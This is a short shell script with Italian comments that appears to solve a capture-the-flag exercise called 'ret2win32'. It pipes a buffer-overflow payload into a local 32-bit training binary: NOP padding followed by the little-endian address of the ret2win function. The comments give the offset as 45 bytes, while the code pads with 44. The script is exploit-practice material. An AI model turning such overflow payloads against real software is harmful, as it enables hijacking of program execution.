#!/bin/sh

# Essendo l'architettura a 32bit mi ricavo l'offset dell'EIP e non del RIP (che è per i 64bit), che in questo caso è pari a 45 byte.
# Quindi aggiundo l'indirizzo in cui comincia la funzione "ret2win32" che è 0x08048659 senza gli ulteriori 4 byte di padding 
# poiché arch a 32bit. Infine inverto l'indirizzo poiché Little Endian.


python -c 'print "\x90"*44 + "\x59\x86\x04\x08"' | ./ret2win32
